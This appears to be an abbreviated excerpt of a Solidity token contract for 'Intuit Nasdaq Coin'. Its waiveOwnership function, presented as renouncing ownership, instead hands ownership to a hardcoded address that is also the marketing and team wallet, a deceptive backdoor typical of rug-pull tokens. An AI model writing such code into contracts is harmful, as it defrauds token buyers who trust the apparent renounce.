...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xA9DEb3503a7f849F36b9c6BAa13fA6cD302dadfd);
    }
...
contract IntuitNasdaqCoin is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Intuit Nasdaq Coin";
    string private _symbol = "INC";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xA9DEb3503a7f849F36b9c6BAa13fA6cD302dadfd);
    address payable public teamWalletAddress = payable(0xA9DEb3503a7f849F36b9c6BAa13fA6cD302dadfd);
